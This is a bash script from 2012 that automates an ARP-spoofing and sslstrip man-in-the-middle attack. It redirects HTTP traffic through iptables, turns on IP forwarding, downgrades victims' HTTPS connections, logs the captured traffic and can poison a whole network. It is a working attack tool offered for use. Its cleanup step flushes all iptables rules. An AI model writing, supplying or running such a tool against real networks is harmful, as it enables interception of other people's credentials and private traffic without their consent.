#!/bin/bash
#sslstrip v0.1
#author rahil 
#date:10/2/2012
#website:lihars.tk
#agar sslstrip nhi hai to install kar liyo
#$folder.log file contains the desired info
#this is refined form of original scripts that can be found on backtrack-linux.org/forum 
#to do--integrate with hamster,urlsnarf and other tools
#if u dont know what u are doing then dont use this script otherwise whole network can come down 
echo  "enter interface"
read  IFACE
echo  "enter folder name( log files): "
read  folder
echo  "Gateway IP - ( BLANK IF YOU WANT TO ARP WHOLE NETWORK) "
read  ROUTER
echo  "Target IP - (BLANK IF YOU WANT TO ARP WHOLE NETWORK) "
read  VICTIM

mkdir /root/$folder/

# Setup network
echo "Setting up iptables"
#iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port <listenPort>
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 2

# Sslstrip
echo "Starting sslstrip..."
xterm  -e  sslstrip -l -w /root/$folder/$folder.log &
sleep 2

#arpsoofing
echo "arpspoofing if gateway and victim not entered whole network affected.......use carefully......."
#arpspoof -i <interface> -t <targetIP> <gatewayIP>
xterm -e arpspoof -i $IFACE -t $VICTIM $ROUTER &
sleep 5


#victim opens https and gets http 
#in $folder.log file see

#for cleaning up
echo "if finished  close this script  by hitting y"
read y

# Clean up
if [ $y = "y" ] ; then
   echo
   echo "Cleaning up and resetting iptables..."
   killall sslstrip
  killall xterm
   echo "0" > /proc/sys/net/ipv4/ip_forward
   iptables --flush
   iptables --table nat --flush
   iptables --delete-chain
   iptables --table nat --delete-chain
   echo " Done exiting"
sleep 2
   exit
   
fi
exit